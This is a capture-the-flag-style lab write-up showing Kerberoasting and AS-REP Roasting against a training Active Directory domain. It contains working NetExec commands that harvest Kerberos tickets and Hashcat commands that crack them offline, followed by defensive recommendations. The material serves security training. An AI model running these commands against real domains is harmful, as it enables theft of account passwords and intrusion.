---
title: "Kerberoasting in Active Directory: Four Practical Attack Techniques"
description: "A hands-on HackSmarter lab exploring standard and targeted Kerberoasting, AS-REP Roasting, and roasting with a no-preauthentication account using NetExec and Hashcat."
pubDate: 2026-11-13
heroImage: "/images/kerberoasting/kerberoasting-cover.png"
category: "Active Directory"
difficulty: "Easy"
---

# Kerberoasting in Active Directory: Four Practical Attack Techniques

> **Lab:** HackSmarter Kerberoasting Lab · **Difficulty:** Easy · **Environment:** `hacksmarter.hsm` · **Target:** `DC01` · **Tools:** RustScan, Nmap, NetExec, Hashcat

![Kerberoasting lab cover](/images/kerberoasting/kerb.png)

## Overview

In this lab I explored several ways to obtain Kerberos authentication material and test its resistance to offline password guessing. The goal was to understand *why* the techniques work, rather than just run a cracking command. Starting with a supplied low-privilege domain account, I enumerated the domain controller, discovered accounts, and tested four related approaches.

**Terminology matters:** the third technique below is **AS-REP Roasting**, not Kerberoasting. Both can lead to offline password cracking, but they request different Kerberos messages and rely on different conditions.

## Lab environment and initial access

The lab supplied a domain account, `pentest`, and a password (redacted here). All commands were run in an authorized training environment. The target domain was `hacksmarter.hsm`, with domain controller `DC01` at `10.1.145.245`.

To avoid publishing working lab passwords, commands below use a placeholder. Substitute your own authorized lab credentials when reproducing the exercises.

```bash
export LAB_USER='pentest'
# Set LAB_PASS locally; do not commit it to your blog or repository.
read -rs LAB_PASS
```

## 1. Reconnaissance: identify Active Directory services

I began with RustScan and Nmap to discover exposed services and identify the domain controller.

```bash
rustscan -a 10.1.145.245 -- -A
```

The scan reported a Windows Server 2022 domain controller, the `hacksmarter.hsm` domain, and the following notable ports:

| Port | Service | Why it matters |
| --- | --- | --- |
| 53 | DNS | Domain name resolution |
| 88 | Kerberos | Ticket-based authentication |
| 389 / 636 | LDAP / LDAPS | Directory enumeration |
| 445 | SMB | Domain and share enumeration |
| 3268 / 3269 | Global Catalog | Forest-wide directory lookups |
| 5985 | WinRM | Remote administration surface |
| 9389 | AD Web Services | Active Directory management interface |

The RDP certificate identified `dc01.hacksmarter.hsm`, while Nmap's LDAP detection identified the domain. These observations established a suitable environment for Kerberos-focused enumeration.

## 2. Enumerating domain accounts with NetExec

I first validated the supplied account over SMB and checked shares, groups, and users:

```bash
nxc smb 10.1.145.245 -u "$LAB_USER" -p "$LAB_PASS"
nxc smb 10.1.145.245 -u "$LAB_USER" -p "$LAB_PASS" --shares
nxc smb 10.1.145.245 -u "$LAB_USER" -p "$LAB_PASS" --groups
nxc smb 10.1.145.245 -u "$LAB_USER" -p "$LAB_PASS" --users
```

NetExec identified `DC01` as a Windows Server 2022 domain controller with SMB signing enabled and SMBv1 disabled. I also exported LDAP-discovered usernames for subsequent testing:

```bash
nxc ldap 10.1.145.245 -u "$LAB_USER" -p "$LAB_PASS" --users-export users.txt
```

The export reported **16 domain users**, including `eve_marketing`, `jack_exec`, and `backup_svc`, which became relevant later.

## 3. Standard Kerberoasting: discover roastable service accounts

### Why it works

A domain user can request a Kerberos service ticket (TGS) for an account with a Service Principal Name (SPN). The ticket contains material encrypted using a key derived from the service account's password. If a weak password and crackable encryption type are in use, an attacker can attempt offline guessing against the captured ticket.

### Request tickets with NetExec

```bash
nxc ldap 10.1.145.245 -u "$LAB_USER" -p "$LAB_PASS" --kerberoasting hashes.txt
```

**Observed result:** NetExec returned one roastable account, `eve_marketing`, and a `$krb5tgs$23$...` hash. The `23` identifies RC4-HMAC Kerberos encryption type 23.

```text
sAMAccountName: eve_marketing
Total of records returned: 1
$krb5tgs$23$*eve_marketing$HACKSMARTER.HSM$... [redacted]
```

### Test password strength offline

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

The original Hashcat output reported `Status: Cracked` and `Recovered: 1/1`. This demonstrates the danger of a weak service-account password: the guessing occurs offline after the ticket is obtained.

## 4. Targeted Kerberoasting: request a specific account

Instead of enumerating every roastable account, the next exercise targeted `jack_exec` explicitly.

```bash
nxc ldap 10.1.145.245 -u "$LAB_USER" -p "$LAB_PASS" \
  --kerberoasting targeted_kerberoast.txt \
  --targeted-kerberoast jack_exec
```

I then tested the saved material with Hashcat:

```bash
hashcat -m 13100 targeted_kerberoast.txt /usr/share/wordlists/rockyou.txt
```

**Observed result:** Hashcat reported `Status: Cracked` for the targeted capture. This illustrates how a tester can focus on a specific identity instead of collecting every available service ticket.

**Important distinction:** NetExec's `--targeted-kerberoast` option targets an account for ticket requests; it does not, by itself, prove that the operator modified the target's SPN or its directory permissions. The export does not document an SPN modification, so I have not claimed one occurred.

## 5. AS-REP Roasting: accounts without pre-authentication

AS-REP Roasting is a **separate Kerberos technique**. When an account does not require Kerberos pre-authentication, a client may obtain an AS-REP containing password-derived encrypted material without first knowing that account's password. This material can then be tested offline.

I tested the exported usernames using NetExec:

```bash
nxc ldap 10.1.145.245 -u users.txt -p '' --asreproast output.txt
```

The original notes then used `backup.hash` as the Hashcat input filename. Ensure the actual AS-REP output is saved under the filename passed to Hashcat; for example:

```bash
hashcat -m 18200 output.txt /usr/share/wordlists/rockyou.txt
```

Hashcat mode **18200** is for Kerberos 5 AS-REP etype 23, whereas mode **13100** is for Kerberos 5 TGS-REP etype 23. The lab output reported a successful crack.

## 6. Kerberoasting with a no-preauthentication account

The final exercise used `backup_svc`, identified in the output as an account vulnerable to AS-REP Roasting, to request Kerberoastable service-ticket material.

```bash
nxc ldap 10.1.145.245 -u 'backup_svc' -p '' \
  --no-preauth-targets users.txt \
  --kerberoasting kerberoast_hashes.txt
```

NetExec reported that `backup_svc` was vulnerable to AS-REP Roasting and returned a TGS hash for `eve_marketing`:

```text
backup_svc account vulnerable to asreproast attack
Total of records returned: 1
$krb5tgs$23$*eve_marketing$HACKSMARTER.HSM$... [redacted]
```

I then tested the returned ticket with:

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

Hashcat again reported `Status: Cracked` and `Recovered: 1/1`.

**What this demonstrates:** a no-preauthentication account can create an additional route to obtaining Kerberos service tickets in a permissive environment. The captured artifact in this final step is a **TGS**, not an AS-REP, and it belongs to `eve_marketing`.

## Comparing the techniques

| Technique | Kerberos material | Key prerequisite | Hashcat mode |
| --- | --- | --- | --- |
| Standard Kerberoasting | TGS-REP | Requestable service ticket for an SPN account | 13100 (etype 23) |
| Targeted Kerberoasting | TGS-REP | Specific eligible target account | 13100 (etype 23) |
| AS-REP Roasting | AS-REP | Target does not require pre-authentication | 18200 (etype 23) |
| No-preauth-assisted Kerberoasting | TGS-REP | Suitable no-preauth identity and service-ticket request path | 13100 (etype 23) |

These Hashcat modes match the **etype 23 artifacts actually observed in this lab**; other Kerberos encryption types require different modes.

## Defensive takeaways

- Use long, unique, randomly generated service-account passwords; consider group Managed Service Accounts (gMSAs) where supported.
- Prefer modern Kerberos encryption and reduce or eliminate RC4 where compatibility permits.
- Require Kerberos pre-authentication for user accounts unless there is a documented, justified exception.
- Audit SPNs, service identities, and privileged account exposure regularly.
- Monitor unusual service-ticket activity (including event 4769) and authentication anomalies, while correlating with normal application behavior.

## What I learned

This lab helped me distinguish three concepts that are easy to conflate: **finding an SPN-backed identity**, **requesting a service ticket**, and **cracking the captured material offline**. It also showed why AS-REP Roasting deserves its own category: it exploits a different account setting and uses a different Kerberos message.

The most useful lesson was that successful enumeration is not the same as compromise. The risk emerged when the captured authentication material was protected by passwords weak enough to recover with a common wordlist.

---

*All activity described here was performed in an authorized HackSmarter training lab. Captured hashes and supplied passwords have been omitted from the public writeup.*
